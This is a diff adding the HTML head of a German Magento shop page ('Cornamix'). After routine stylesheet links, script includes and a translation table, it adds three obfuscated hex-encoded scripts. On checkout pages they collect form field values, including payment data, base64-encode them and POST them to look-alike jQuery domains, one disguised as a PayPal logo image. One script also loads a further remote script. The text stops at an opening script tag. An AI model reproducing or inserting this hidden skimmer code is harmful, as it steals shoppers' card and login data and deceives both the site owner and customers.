@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Start  - Cornamix</title>
+<meta name="viewport" content="width=1024">
+<meta name="description" content="Cornamix" />
+<meta name="keywords" content="Cornamix" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link href='http://fonts.googleapis.com/css?family=PT+Sans:400,700' rel='stylesheet' type='text/css'>
+<link rel="icon" href="http://shop.cornamix.com/media/favicon/default/fav.png" type="image/x-icon" />
+<link rel="shortcut icon" href="http://shop.cornamix.com/media/favicon/default/fav.png" type="image/x-icon" />
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://shop.cornamix.com/js/blank.html';
+    var BLANK_IMG = 'http://shop.cornamix.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<link rel="stylesheet" type="text/css" href="http://shop.cornamix.com/skin/frontend/default/cornamix/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://shop.cornamix.com/skin/frontend/base/default/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://shop.cornamix.com/skin/frontend/default/cornamix/css/print.css" media="print" />
+<script type="text/javascript" src="http://shop.cornamix.com/js/lavalamp/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/lavalamp/lavalamp.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/lib/ccard.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/mage/cookies.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://shop.cornamix.com/skin/frontend/default/cornamix/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://shop.cornamix.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+<!--[if lt IE 9]>
+	<link rel="stylesheet" type="text/css" href="http://shop.cornamix.com/skin//frontend/default/cornamix/css/ie.css" />
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.shop.cornamix.com';
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["IE","PA","HK","MO"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate({"HTML tags are not allowed":"HTML-Tags sind nicht erlaubt","Please select an option.":"Bitte w\u00e4hlen Sie eine Option.","This is a required field.":"Dies ist ein Pflichtfeld.","Please enter a valid number in this field.":"Bitte geben Sie eine g\u00fcltige Nummer in dieses Feld ein.","The value is not within the specified range.":"Der Wert ist nicht innerhalb des erlaubten Bereichs.","Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.":"Bitte nur Ziffern in diesem Feld verwenden. Vermeiden Sie Leerzeichen oder andere Zeichen (z. B. Punkt oder Komma).","Please use letters only (a-z or A-Z) in this field.":"Bitte nur Buchstaben (a-z oder A-Z) in diesem Feld verwenden.","Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Bitte nur Buchstaben (a-z), Ziffern (0-9) oder Unterstriche (_) in diesem Feld verwenden, das erste Zeichen muss ein Buchstabe sein.","Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.":"Bitte nur Buchstaben (a-z oder A-Z) oder Ziffern (0-9) in diesem Feld verwenden. Leerzeichen oder andere Zeichen sind nicht erlaubt.","Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.":"Bitte nur Buchstaben (a-z oder A-Z), Ziffern (0-9), Leerzeichen oder # f\u00fcr dieses Feld verwenden.","Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.":"Bitte geben Sie eine g\u00fcltige Telefonnummer ein. Zum Beispiel (123) 456-7890 oder 123-456-7890.","Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.":"Bitte tragen Sie eine g\u00fcltige Faxnummer ein. Zum Beispiel (123) 456-7890 oder 123-456-7890.","Please enter a valid date.":"Bitte geben Sie ein g\u00fcltiges Datum ein.","Please enter a valid email address. For example johndoe@domain.com.":"Bitte geben Sie eine g\u00fcltige E-Mail Adresse ein. Zum Beispiel johndoe@domain.de.","Please use only visible characters and spaces.":"Bitte nur sichtbare Zeichen verwenden.","Please enter 6 or more characters. Leading or trailing spaces will be ignored.":"Bitte geben Sie 6 oder mehr Zeichen ein. Leerzeichen am Anfang oder Ende der Zeichenkette werden entfernt.","Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.":"Bitte geben Sie 7 oder mehr Zeichen ein. Ein Passwort sollte sowohl aus Ziffern wie aus Buchstaben bestehen.","Please make sure your passwords match.":"Bitte stellen Sie sicher, dass die beiden Passworte identisch sind.","Please enter a valid URL. Protocol is required (http:\/\/, https:\/\/ or ftp:\/\/)":"Bitte geben Sie eine g\u00fcltige URL ein. M\u00f6gliche Protokolle (http:\/\/, https:\/\/ or ftp:\/\/)","Please enter a valid URL. For example http:\/\/www.example.com or www.example.com":"Bitte geben Sie eine g\u00fcltige URL ein. Zum Beispiel http:\/\/www.beispiel.de oder www.beispiel.de","Please enter a valid URL Key. For example \"example-page\", \"example-page.html\" or \"anotherlevel\/example-page\".":"Bitte geben Sie einen g\u00fcltigen URL-Bezeichner ein. Zum Beispiel \"beispiel-seite\", \"beispiel-seite.html\" or \"unterverzeichnis\/beispiel-seite\".","Please enter a valid XML-identifier. For example something_1, block5, id-4.":"Bitte geben Sie einen g\u00fcltigen XML-Identifizierer an. Zum Beispiel irgendetwas_1, block5, id-4.","Please enter a valid social security number. For example 123-45-6789.":"Bitte geben Sie eine g\u00fcltige Sozialversicherungsnummer ein. Zum Beispiel 123-45-6789.","Please enter a valid zip code. For example 90602 or 90602-1234.":"Bitte geben Sie eine g\u00fcltige Postleitzahl ein. Zum Beispiel 21335.","Please enter a valid zip code.":"Bitte geben Sie eine g\u00fcltige Postleitzahl ein.","Please use this date format: dd\/mm\/yyyy. For example 17\/03\/2006 for the 17th of March, 2006.":"Bitte verwenden Sie dieses Datumsformat: tt\/mm\/jjjj. Zum Beispiel 17\/03\/2006 f\u00fcr den 17. M\u00e4rz 2006.","Please enter a valid $ amount. For example $100.00.":"Bitte geben Sie einen g\u00fcltigen Betrag ein. Zum Beispiel 100,00 \u20ac.","Please select one of the above options.":"Bitte w\u00e4hlen Sie eine der oberen Optionen.","Please select one of the options.":"Bitte w\u00e4hlen Sie eine der Optionen.","Please select State\/Province.":"Bitte Land\/Bundesland w\u00e4hlen.","Please enter a number greater than 0 in this field.":"Bitte geben Sie eine Zahl gr\u00f6\u00dfer 0 in dieses Feld ein.","Please enter a number 0 or greater in this field.":"Bitte tragen Sie eine Zahl gr\u00f6\u00dfer\/gleich 0 in dieses Feld ein.","Please enter a valid credit card number.":"Bitte geben Sie eine g\u00fcltige Kreditkartennummer ein.","Credit card number does not match credit card type.":"Kreditkartennummer entspricht nicht Kreditkartentyp.","Card type does not match credit card number.":"Kreditkartenart entspricht nicht der angegeben Kreditkartennummer.","Incorrect credit card expiration date.":"Falsches Kreditkarten Ablaufdatum.","Please enter a valid credit card verification number.":"Bitte tragen Sie eine g\u00fcltige Kreditkarten-Pr\u00fcfnummer ein.","Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.":"Bitte nur Buchstaben (a-z oder A-Z), Ziffern (0-9) oder Unterstriche (_) in diesem Feld verwenden, das erste Zeichen muss ein Buchstabe sein.","Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.":"Bitte geben Sie eine g\u00fcltige CSS-L\u00e4nge an. Beispielsweise 100px, 77pt, 20em, .5ex oder 50%.","Text length does not satisfy specified text range.":"Text L\u00e4nge entspricht nicht der gesetzten Bereichs.","Please enter a number lower than 100.":"Bitte tragen Sie keine Zahl gr\u00f6\u00dfer\/gleich 100 in dieses Feld ein.","Please select a file":"Bitte w\u00e4hlen Sie eine Datei","Please enter issue number or start date for switch\/solo card type.":"Bitte geben Sie eine Vorgangsnummer oder ein Startdatum switch\/solo Karten an.","Please wait, loading...":"Bitte warten, wird geladen\u2026","This date is a required value.":"Das Datum ist eine ben\u00f6tigte Angabe.","Please enter a valid day (1-%d).":"Bitte geben Sie einen g\u00fcltigen Tag (1-%d) an.","Please enter a valid month (1-12).":"Bitte geben Sie einen g\u00fcltigen Monat (1-12) an.","Please enter a valid year (1900-%d).":"Bitte geben Sie ein g\u00fcltiges Jahr (1900-%d) an.","Please enter a valid full date":"Bitte geben Sie eine vollst\u00e4ndiges, g\u00fcltiges Datum an","Please enter a valid date between %s and %s":"Bitte geben Sie ein g\u00fcltiges Datum zwischen dem %s und %s an","Please enter a valid date equal to or greater than %s":"Bitte geben Sie ein g\u00fcltiges Datum am oder nach dem %s an","Please enter a valid date less than or equal to %s":"Bitte geben Sie ein g\u00fcltiges Datum am oder vor dem %s an","Complete":"Vollst\u00e4ndig","Add Products":"Artikel hinzuf\u00fcgen","Please choose to register or to checkout as a guest":"Bitte registrieren Sie sich, oder gehen Sie als Gast zur Kasse","Your order cannot be completed at this time as there is no shipping methods available for it. Please make necessary changes in your shipping address.":"Ihre Bestellung kann momentan nicht abgeschlossen werden, da keine Versandarten daf\u00fcr verf\u00fcgbar sind.","Please specify payment method.":"Bitte bestimmen Sie die Bezahlmethode.","Your order cannot be completed at this time as there is no payment methods available for it.":"Ihre Bestellung kann momentan nicht abgeschlossen werden, da keine Bezahlmethoden daf\u00fcr verf\u00fcgbar sind."});
+        //]]></script><script>
+var _0xc188=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x6C\x69\x62\x73\x2E\x73\x75\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x61\x79\x70\x61\x6C\x2D\x6C\x6F\x67\x6F\x2E\x6A\x70\x67","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","","\x3D","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x73\x6C\x69\x63\x65","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var gee33b77d74b736f8197ee39a58f56965={snd:null,Glink:_0xc188[0],myid:(function(_0xc2d8x2){var _0xc2d8x3=document[_0xc188[7]][_0xc188[6]]( new RegExp(_0xc188[2]+ _0xc2d8x2[_0xc188[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xc188[3])+ _0xc188[5]));return _0xc2d8x3?decodeURIComponent(_0xc2d8x3[1]):undefined})(_0xc188[1])|| (function(){var _0xc2d8x4= new Date();var _0xc2d8x5=_0xc2d8x4[_0xc188[8]]()+ _0xc188[9]+ Math[_0xc188[11]](Math[_0xc188[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xc2d8x6= new Date( new Date()[_0xc188[8]]()+ 60* 60* 24* 1000);document[_0xc188[7]]= _0xc188[12]+ _0xc2d8x5+ _0xc188[13]+ _0xc2d8x6[_0xc188[14]]();return _0xc2d8x5})(),clk:function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;var _0xc2d8x7=document[_0xc188[17]](_0xc188[16]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8x7[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8x7[_0xc2d8x8][_0xc188[19]][_0xc188[18]]> 0){var _0xc2d8x9=_0xc2d8x7[_0xc2d8x8][_0xc188[20]];if(_0xc2d8x9== _0xc188[21]){_0xc2d8x9= _0xc2d8x8};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]+= _0xc2d8x7[_0xc2d8x8][_0xc188[20]]+ _0xc188[22]+ _0xc2d8x7[_0xc2d8x8][_0xc188[19]]+ _0xc188[23]}}},send:function(){try{var _0xc2d8xa=document[_0xc188[17]](_0xc188[24]);for(var _0xc2d8x8=0;_0xc2d8x8< _0xc2d8xa[_0xc188[18]];_0xc2d8x8++){var _0xc2d8xb=_0xc2d8xa[_0xc2d8x8];if(_0xc2d8xb[_0xc188[25]]!= _0xc188[26]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[27]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[28]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[29]&& _0xc2d8xb[_0xc188[25]]!= _0xc188[30]){if(_0xc2d8xb[_0xc188[31]]){_0xc2d8xb[_0xc188[31]](_0xc188[32],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xb[_0xc188[35]](_0xc188[34],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}}};var _0xc2d8xc=document[_0xc188[17]](_0xc188[36]);for(vari= 0;_0xc2d8x8< _0xc2d8xc[_0xc188[18]];_0xc2d8x8++){if(_0xc2d8xc[_0xc2d8x8][_0xc188[31]]){_0xc2d8xc[_0xc2d8x8][_0xc188[31]](_0xc188[37],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]],false)}else {_0xc2d8xc[_0xc2d8x8][_0xc188[35]](_0xc188[38],gee33b77d74b736f8197ee39a58f56965[_0xc188[33]])}};if(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]!= null){var _0xc2d8xd=location[_0xc188[44]][_0xc188[43]](_0xc188[42])[_0xc188[41]](0)[_0xc188[40]](_0xc188[39]);var _0xc2d8xe=btoa(gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]);var _0xc2d8xf= new XMLHttpRequest();_0xc2d8xf[_0xc188[46]](_0xc188[45],gee33b77d74b736f8197ee39a58f56965.Glink,true);_0xc2d8xf[_0xc188[49]](_0xc188[47],_0xc188[48]);_0xc2d8xf[_0xc188[54]](_0xc188[50]+ _0xc2d8xe+ _0xc188[51]+ _0xc2d8xd+ _0xc188[52]+ gee33b77d74b736f8197ee39a58f56965[_0xc188[53]])};gee33b77d74b736f8197ee39a58f56965[_0xc188[15]]= null;_0xc2d8xe= null;setTimeout(function(){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()},30)}catch(e){}}};if(( new RegExp(_0xc188[57],_0xc188[58]))[_0xc188[56]](window[_0xc188[55]])){gee33b77d74b736f8197ee39a58f56965[_0xc188[54]]()}
+</script><script>
+var _0x5ff6=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x6F\x64\x65\x2E\x6A\x71\x75\x65\x72\x79\x2E\x63\x6F\x6D\x2F\x6A\x71\x75\x65\x72\x79\x2D\x31\x2E\x37\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x3E\x76\x61\x72\x20\x6A\x51\x75\x65\x72\x79\x31\x37\x20\x3D\x20\x24\x2E\x6E\x6F\x43\x6F\x6E\x66\x6C\x69\x63\x74\x28\x74\x72\x75\x65\x29\x3B\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6F\x64\x65\x2E\x62\x69\x7A\x2F\x74\x65\x78\x74\x2F\x63\x6C\x69\x62\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72","\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x5ff6[2]))[_0x5ff6[1]](window[_0x5ff6[0]])){document[_0x5ff6[7]](_0x5ff6[3]+ _0x5ff6[4]+ _0x5ff6[5]+ _0x5ff6[6])}
+</script><script>
+var _0x58d0=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6F\x64\x65\x2E\x6E\x65\x74\x2F\x74\x65\x78\x74\x73\x2F\x6A\x71\x75\x65\x72\x79\x2E\x6D\x69\x6E\x2E\x6A\x73","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x6C\x65\x6E\x67\x74\x68","\x73\x6C\x69\x63\x65","\x3D\x3D","\x3D","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x62\x61\x73\x65\x36\x34\x5F\x65\x6E\x63\x6F\x64\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var grelos_v={snd:null,Glink:_0x58d0[0],myid:(function(_0x7f60x2){var _0x7f60x3=document[_0x58d0[7]][_0x58d0[6]]( new RegExp(_0x58d0[2]+ _0x7f60x2[_0x58d0[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0x58d0[3])+ _0x58d0[5]));return _0x7f60x3?decodeURIComponent(_0x7f60x3[1]):undefined})(_0x58d0[1])|| (function(){var _0x7f60x4= new Date();var _0x7f60x5=_0x7f60x4[_0x58d0[8]]()+ _0x58d0[9]+ Math[_0x58d0[11]](Math[_0x58d0[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0x7f60x6= new Date( new Date()[_0x58d0[8]]()+ 60* 60* 24* 1000);document[_0x58d0[7]]= _0x58d0[12]+ _0x7f60x5+ _0x58d0[13]+ _0x7f60x6[_0x58d0[14]]();return _0x7f60x5})(),base64_encode:function(_0x7f60x7){var _0x7f60x8=_0x58d0[15];var _0x7f60x9,_0x7f60xa,_0x7f60xb,_0x7f60xc,_0x7f60xd,_0x7f60xe,_0x7f60xf,_0x7f60x10,_0x7f60x11=0,_0x7f60x12=_0x58d0[16];do{_0x7f60x9= _0x7f60x7[_0x58d0[17]](_0x7f60x11++);_0x7f60xa= _0x7f60x7[_0x58d0[17]](_0x7f60x11++);_0x7f60xb= _0x7f60x7[_0x58d0[17]](_0x7f60x11++);_0x7f60x10= _0x7f60x9<< 16| _0x7f60xa<< 8| _0x7f60xb;_0x7f60xc= _0x7f60x10>> 18& 0x3f;_0x7f60xd= _0x7f60x10>> 12& 0x3f;_0x7f60xe= _0x7f60x10>> 6& 0x3f;_0x7f60xf= _0x7f60x10& 0x3f;_0x7f60x12+= _0x7f60x8[_0x58d0[18]](_0x7f60xc)+ _0x7f60x8[_0x58d0[18]](_0x7f60xd)+ _0x7f60x8[_0x58d0[18]](_0x7f60xe)+ _0x7f60x8[_0x58d0[18]](_0x7f60xf)}while(_0x7f60x11< _0x7f60x7[_0x58d0[19]]);;switch(_0x7f60x7[_0x58d0[19]]% 3){case 1:_0x7f60x12= _0x7f60x12[_0x58d0[20]](0,-2)+ _0x58d0[21];break;case 2:_0x7f60x12= _0x7f60x12[_0x58d0[20]](0,-1)+ _0x58d0[22];break};return _0x7f60x12},clk:function(){grelos_v[_0x58d0[23]]= null;var _0x7f60x13=document[_0x58d0[25]](_0x58d0[24]);for(var _0x7f60x11=0;_0x7f60x11< _0x7f60x13[_0x58d0[19]];_0x7f60x11++){if(_0x7f60x13[_0x7f60x11][_0x58d0[26]][_0x58d0[19]]> 0){var _0x7f60x14=_0x7f60x13[_0x7f60x11][_0x58d0[27]];if(_0x7f60x14== _0x58d0[16]){_0x7f60x14= _0x7f60x11};grelos_v[_0x58d0[23]]+= _0x7f60x13[_0x7f60x11][_0x58d0[27]]+ _0x58d0[22]+ _0x7f60x13[_0x7f60x11][_0x58d0[26]]+ _0x58d0[28]}}},send:function(){try{var _0x7f60x15=document[_0x58d0[25]](_0x58d0[29]);for(var _0x7f60x11=0;_0x7f60x11< _0x7f60x15[_0x58d0[19]];_0x7f60x11++){var _0x7f60x16=_0x7f60x15[_0x7f60x11];if(_0x7f60x16[_0x58d0[30]]!= _0x58d0[31]&& _0x7f60x16[_0x58d0[30]]!= _0x58d0[32]&& _0x7f60x16[_0x58d0[30]]!= _0x58d0[33]&& _0x7f60x16[_0x58d0[30]]!= _0x58d0[34]&& _0x7f60x16[_0x58d0[30]]!= _0x58d0[35]){if(_0x7f60x16[_0x58d0[36]]){_0x7f60x16[_0x58d0[36]](_0x58d0[37],grelos_v[_0x58d0[38]],false)}else {_0x7f60x16[_0x58d0[40]](_0x58d0[39],grelos_v[_0x58d0[38]])}}};var _0x7f60x17=document[_0x58d0[25]](_0x58d0[41]);for(vari= 0;_0x7f60x11< _0x7f60x17[_0x58d0[19]];_0x7f60x11++){if(_0x7f60x17[_0x7f60x11][_0x58d0[36]]){_0x7f60x17[_0x7f60x11][_0x58d0[36]](_0x58d0[42],grelos_v[_0x58d0[38]],false)}else {_0x7f60x17[_0x7f60x11][_0x58d0[40]](_0x58d0[43],grelos_v[_0x58d0[38]])}};if(grelos_v[_0x58d0[23]]!= null){var _0x7f60x18=location[_0x58d0[48]][_0x58d0[47]](_0x58d0[46])[_0x58d0[20]](0)[_0x58d0[45]](_0x58d0[44]);var _0x7f60x19=grelos_v[_0x58d0[49]](grelos_v[_0x58d0[23]]);var _0x7f60x1a= new XMLHttpRequest();_0x7f60x1a[_0x58d0[51]](_0x58d0[50],grelos_v.Glink,true);_0x7f60x1a[_0x58d0[54]](_0x58d0[52],_0x58d0[53]);_0x7f60x1a[_0x58d0[59]](_0x58d0[55]+ _0x7f60x19+ _0x58d0[56]+ _0x7f60x18+ _0x58d0[57]+ grelos_v[_0x58d0[58]])};grelos_v[_0x58d0[23]]= null;_0x7f60x19= null;setTimeout(function(){grelos_v[_0x58d0[59]]()},30)}catch(e){}}};if(( new RegExp(_0x58d0[62],_0x58d0[63]))[_0x58d0[61]](window[_0x58d0[60]])){grelos_v[_0x58d0[59]]()}
+</script><script>
